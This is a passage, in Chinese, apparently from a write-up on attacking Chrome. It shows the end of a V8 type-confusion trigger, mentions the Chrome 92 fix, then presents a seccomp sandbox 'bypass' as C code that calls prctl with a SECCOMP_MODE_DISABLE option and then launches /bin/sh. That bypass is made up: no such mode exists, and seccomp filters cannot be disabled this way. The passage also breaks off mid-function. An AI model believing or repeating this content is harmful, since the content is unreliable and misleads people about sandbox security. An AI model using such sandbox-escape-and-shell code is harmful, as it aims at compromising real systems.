for (let i = 0; i < 10000; i++) trigger();
// 之后获得任意读写原语


修复：Chrome 92中修复了V8的类型混淆，并加强了Mojo消息的完整性校验。

Chromium沙箱在Linux上使用seccomp-bpf过滤系统调用，允许白名单内的调用（如`read`、`write`、`mmap`等），禁止危险调用（如`execve`、`ptrace`、`clone`等）。绕过技术：利用`prctl`系统调用的`PR_SET_SECCOMP`选项，如果沙箱规则未正确禁止`prctl`，攻击者可以调用`prctl(PR_SET_SECCOMP, SECCOMP_MODE_DISABLE, ...)`禁用seccomp。但Chrome沙箱通常禁止`prctl`或只允许特定子功能。另一种绕过：利用`prctl(PR_SET_MM, ...)`修改进程内存映射，例如将只读内存改为可写，然后覆盖GOT表。C代码示例：

c
#include <sys/prctl.h>
#include <linux/prctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    // 尝试禁用seccomp
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_DISABLE, 0, 0, 0) == 0) {
        printf("Seccomp disabled!\n");
        // 现在可以执行execve
        execl("/bin/sh", "/bin/sh", NULL);
    } else {
        perror("prctl failed");
    }
    return 0;
